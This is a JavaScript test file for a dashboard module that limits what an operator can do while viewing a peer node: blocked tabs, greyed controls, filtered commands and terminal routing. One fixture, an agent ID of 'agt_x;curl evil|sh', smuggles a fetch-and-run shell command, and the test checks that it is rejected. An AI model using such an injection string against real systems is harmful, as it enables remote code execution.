import test from 'node:test'; import assert from 'node:assert/strict';
import { createPreactHarness } from './preact-harness.mjs';

const pv = { peer: 'desk', included: ['agents.status', 'groups', 'messaging', 'audit'], omitted: [{ feature: 'costs', requires: 'costs.read' }] };

test('feature and tab states follow the peer_view metadata', async (t) => {
  const harness = await createPreactHarness(t);
  const mod = await harness.importDashboardModule('js/peer-view-limits.js');
  assert.equal(mod.tabState('groups', pv), 'shared');
  assert.equal(mod.tabState('audit', pv), 'shared');
  assert.equal(mod.tabState('costs', pv), 'omitted');
  assert.equal(mod.tabState('config', pv), 'local');
  assert.equal(mod.tabState('map', pv), 'shared', 'the map is this operator\'s own fleet view');
  assert.equal(mod.tabState('terminals', pv), 'shared', 'a peer\'s agent opens in this browser\'s Terminals tab');
  assert.equal(mod.tabState('groups', null), 'shared', 'before the first answer the snapshot view is assumed');
  assert.equal(mod.tabState('costs', null), 'omitted');
  assert.equal(mod.limitHint('omitted', 'costs', 'forge'), 'forge does not share costs with you');
  assert.equal(mod.limitHint('local', 'the config tab', 'forge'), 'the config tab is not available in a peer view');
});

test('on a peer view, blocked controls are greyed and clicks never reach their handlers', async (t) => {
  const harness = await createPreactHarness(t);
  const mod = await harness.importDashboardModule('js/peer-view-limits.js');
  const doc = harness.document;
  doc.body.innerHTML = `<nav><a data-tab="groups">Groups</a><a data-tab="costs">Costs</a><a data-tab="config">Config</a></nav>
    <button id="retire" data-act="retire-agent">retire</button><button id="dot" data-act="dot-toggle">dot</button><button id="menu" data-act="group-menu">⚙</button>
    <button id="group-create-open">+ new group</button><button id="filter">filter</button>`;
  const snapshot = harness.signals.signal({ peer_view: pv });
  const toasts = [];
  doc.documentElement.dataset.remoteNodeName = 'forge';
  const dispose = mod.installPeerViewLimits({ doc, snapshot, toast: (m) => toasts.push(m), remote: { id: 'inst_forge7' } });
  const tab = (name) => doc.querySelector(`[data-tab="${name}"]`);
  assert.equal(tab('groups').classList.contains('pv-off'), false);
  assert.equal(tab('costs').classList.contains('pv-off'), true);
  assert.equal(tab('costs').getAttribute('title'), 'forge does not share costs with you');
  // linkedom does not order capture before target listeners, so assert the
  // guard's decision (the dashsnap peer-view state proves the browser order).
  const prevented = Object.fromEntries(['retire', 'dot', 'menu', 'group-create-open', 'filter'].map((id) => [id, harness.fireEvent(doc.getElementById(id), 'click').defaultPrevented]));
  assert.deepEqual(prevented, { retire: true, dot: true, menu: false, 'group-create-open': true, filter: false }, 'mutations (the power dot included) and management controls are stopped; view-only controls work');
  assert.equal(toasts.length, 3);
  // Keyboard activation of a role=button chip never reaches its own keydown.
  const enter = harness.fireEvent(doc.getElementById('retire'), 'keydown', { key: 'Enter' });
  assert.equal(enter.defaultPrevented, true);
  assert.equal(harness.fireEvent(doc.getElementById('filter'), 'keydown', { key: 'Enter' }).defaultPrevented, false);
  harness.fireEvent(tab('costs'), 'click');
  assert.equal(toasts.at(-1), 'forge does not share costs with you');
  snapshot.value = { peer_view: { ...pv, included: [...pv.included, 'costs'], omitted: [] } };
  assert.equal(tab('costs').classList.contains('pv-off'), false, 'a new grant lights the tab up on the next snapshot');
  assert.equal(tab('costs').getAttribute('title'), null, 'and drops the stale reason');
  dispose();
  assert.equal(harness.fireEvent(doc.getElementById('retire'), 'click').defaultPrevented, false);
});

test('this node is never limited', async (t) => {
  const harness = await createPreactHarness(t);
  const mod = await harness.importDashboardModule('js/peer-view-limits.js');
  const doc = harness.document;
  doc.body.innerHTML = '<button id="retire" data-act="retire-agent">retire</button>';
  mod.installPeerViewLimits({ doc, snapshot: harness.signals.signal(null), toast: () => {}, remote: undefined });
  assert.equal(harness.fireEvent(doc.getElementById('retire'), 'click').defaultPrevented, false);
});

test('palette commands and tab routing respect what the peer offers', async (t) => {
  const harness = await createPreactHarness(t);
  const mod = await harness.importDashboardModule('js/peer-view-limits.js');
  const remote = { id: 'inst_forge7' };
  const cmds = [
    { label: 'Shut down all' },
    { label: 'Expand group: ops', peerView: 'view' },
    { label: 'Go to Costs', peerView: 'tab', tab: 'costs' },
    { label: 'Go to Groups', peerView: 'tab', tab: 'groups' },
    { label: 'Announce', peerView: 'messaging' },
  ];
  const out = mod.limitPeerViewCommands(cmds, { peer_view: pv }, remote);
  assert.deepEqual(out.map((c) => c.enabled !== false), [false, true, false, true, true]);
  assert.match(out[2].disabledReason, /does not share costs/);
  assert.equal(mod.limitPeerViewCommands(cmds, { peer_view: pv }, undefined), cmds, 'this node: untouched');
  assert.equal(mod.peerViewTabUsable('costs', { remote, peerView: pv }), false);
  assert.equal(mod.peerViewTabUsable('audit', { remote, peerView: pv }), true);
  assert.equal(mod.peerViewTabUsable('config', { remote, peerView: null }), false, 'no peer route at all');
  assert.equal(mod.peerViewTabUsable('costs', { remote, peerView: null }), true, 'a deep link waits for the peer to answer');
  assert.equal(mod.peerViewTabUsable('config', { remote: undefined }), true);
  assert.equal(mod.peerViewTabUsable('terminals', { remote, peerView: pv }), true);
});

test('a peer agent\'s terminal action opens it in the browser terminal', async (t) => {
  const harness = await createPreactHarness(t);
  const mod = await harness.importDashboardModule('js/peer-view-limits.js');
  const doc = harness.document;
  doc.body.innerHTML = '<button id="win" data-act="web-open-window" data-agent="agt_abc123">web window</button><button id="gt" data-act="group-web-term">group term</button><button id="evil" data-act="jump" data-agent="agt_x;curl evil|sh">evil</button><nav><a id="tt" data-tab="terminals" href="/terminals">Terminals</a><a id="ct" data-tab="config" href="/config">Config</a></nav>';
  doc.documentElement.dataset.remoteNodeName = 'forge';
  const opened = []; const toasts = [];
  const dispose = mod.installPeerViewLimits({ doc, snapshot: harness.signals.signal({ peer_view: pv }), toast: (m, err) => toasts.push([m, err]), remote: { id: 'inst_forge7' }, openTerminal: async (o) => { opened.push(o); } });
  assert.equal(harness.fireEvent(doc.getElementById('win'), 'click').defaultPrevented, true, 'the local terminal handler never runs');
  assert.equal(opened.length, 1);
  assert.deepEqual({ instance: opened[0].instance, agent: opened[0].agent, peerLabel: opened[0].peerLabel }, { instance: 'inst_forge7', agent: 'agt_abc123', peerLabel: 'forge' });
  harness.fireEvent(doc.getElementById('gt'), 'click');
  assert.equal(toasts.at(-1)[0], 'This action is not available in a peer view', 'a group directory terminal has nothing to attach to');
  harness.fireEvent(doc.getElementById('evil'), 'click');
  assert.equal(opened.length, 1, 'an agent ID that is not a plain agt_ ID is never opened');
  assert.equal(toasts.at(-1)[0], 'This action is not available in a peer view');
  assert.equal(harness.fireEvent(doc.getElementById('ct'), 'click').defaultPrevented, true, 'a tab with no peer route stays blocked');
  assert.equal(harness.fireEvent(doc.getElementById('tt'), 'click').defaultPrevented, false, 'the Terminals tab, where the peer\'s agent opened, can be shown');
  dispose();
});
